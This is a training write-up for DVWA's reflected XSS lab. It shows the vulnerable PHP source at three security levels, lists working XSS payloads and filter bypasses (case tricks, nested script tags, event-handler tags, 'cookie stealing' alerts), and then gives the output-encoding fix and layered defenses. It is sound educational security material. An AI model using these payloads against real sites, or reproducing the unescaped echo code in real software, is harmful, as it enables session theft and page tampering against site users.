# DVWA Reflected XSS - Penetration Testing Training

> Based on [DVWA (Damn Vulnerable Web Application)](https://github.com/digininja/DVWA) Reflected XSS module, covering Low / Medium / High security levels.

## Table of Contents

- [Overview](#overview)
- [Environment Setup](#environment-setup)
- [Low Level](#low-level)
- [Medium Level](#medium-level)
- [High Level](#high-level)
- [Comparison](#comparison)
- [Fix & Defense](#fix--defense)
- [Disclaimer](#disclaimer)

## Overview

Reflected XSS (Cross-Site Scripting) occurs when an application takes untrusted user input and includes it in HTTP responses without proper validation or escaping. The malicious script is "reflected" off the web server — embedded in a URL or form submission — and executed in the victim's browser.

**Attack Flow:**

```
Attacker crafts malicious URL
        |
        v
Victim clicks the link
        |
        v
Server reflects input into HTML response (no sanitization)
        |
        v
Browser executes malicious script
        |
        v
Cookie / Session stolen, page defaced, phishing triggered...
```

## Environment Setup

| Item | Detail |
|------|--------|
| Platform | DVWA |
| Module | XSS (Reflected) - `/vulnerabilities/xss_r/` |
| Method | GET |
| Parameter | `name` |
| Browser | Chrome / Firefox (XSS Auditor disabled) |
| Tools | Burp Suite / Browser DevTools |

## Low Level

### Source Code

```php
<?php
header ("X-XSS-Protection: 0");

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>
```

### Vulnerability

**No filtering at all.** User input is directly concatenated into HTML output.

### Payloads

Basic alert:

```
<script>alert('XSS')</script>
```

Cookie stealing:

```
<script>alert(document.cookie)</script>
```

## Medium Level

### Source Code

```php
<?php
header ("X-XSS-Protection: 0");

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    echo "<pre>Hello {$name}</pre>";
}
?>
```

### Vulnerability

Uses `str_replace` to remove `<script>` — but only matches the exact lowercase string. Easily bypassed.

### Bypass Methods & Payloads

**1. Case Manipulation** — `str_replace` is case-sensitive:

```
<Script>alert('XSS')</Script>
```

**2. Nested / Double-Write** — inner `<script>` is removed, outer fragments reassemble:

```
<scr<script>ipt>alert('XSS')</scr<script>ipt>
```

**3. Alternative HTML Tags** — `<img>`, `<svg>` are not filtered at all:

```
<img src=1 onerror=alert('XSS')>
```

**Cookie Stealing:**

```
<Script>alert(document.cookie)</Script>
<scr<script>ipt>alert(document.cookie)</scr<script>ipt>
<img src=1 onerror=alert(document.cookie)>
```

## High Level

### Source Code

```php
<?php
header ("X-XSS-Protection: 0");

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    echo "<pre>Hello {$name}</pre>";
}
?>
```

### Vulnerability

Regex with `/i` flag blocks all `<script>` variants (case-insensitive + wildcard). **However, it only targets the `<script>` pattern** — any tag that doesn't contain `script` is completely unaffected.

### Bypass Methods & Payloads

```
<img src=1 onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>
```

**Cookie Stealing:**

```
<img src=1 onerror=alert(document.cookie)>
<svg onload=alert(document.cookie)>
<input onfocus=alert(document.cookie) autofocus>
```

## Comparison

| | Low | Medium | High |
|---|---|---|---|
| **Defense** | None | `str_replace` blacklist | Regex blacklist (`/i` flag) |
| **Scope** | - | Lowercase `<script>` only | All `<script>` variants |
| **Bypass** | Direct injection | Case / Nested / Alt tags | Alt tags + Event handlers |
| **Difficulty** | None | Low | Low-Medium |
| **Root Cause** | No defense | Incomplete blacklist | Only blocks one tag pattern |

**Key Takeaway:** All three levels share the same fundamental flaw — **no output encoding**. Blacklist filtering, no matter how sophisticated, can always be bypassed.

## Fix & Defense

### Correct Approach (DVWA Impossible Level)

```php
<?php
header("X-XSS-Protection: 1; mode=block");
header("Content-Security-Policy: script-src 'self'");

if (array_key_exists("name", $_GET) && $_GET['name'] != NULL) {
    // Output encoding — the real fix
    $name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
    echo "<pre>Hello {$name}</pre>";
}
?>
```

### Why This Works

`htmlspecialchars()` converts special characters to HTML entities:

| Char | Entity | Effect |
|------|--------|--------|
| `<` | `&lt;` | Prevents tag creation |
| `>` | `&gt;` | Prevents tag closure |
| `"` | `&quot;` | Prevents attribute escape |
| `'` | `&#039;` | Prevents single-quote escape |
| `&` | `&amp;` | Prevents entity bypass |

### Defense in Depth

| Layer | Measure |
|-------|---------|
| Code | `htmlspecialchars()` output encoding |
| HTTP | `Content-Security-Policy` header |
| Browser | `X-XSS-Protection: 1; mode=block` |
| Architecture | Template engines with auto-escaping (Twig, Blade) |
| CI/CD | Automated XSS scanning |

## Disclaimer

This repository is for **authorized security training and educational purposes only**. All tests were conducted on a local DVWA instance. Do not use these techniques against any system without explicit written authorization. Unauthorized access to computer systems is illegal.

## References

- [DVWA Official Repository](https://github.com/digininja/DVWA)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
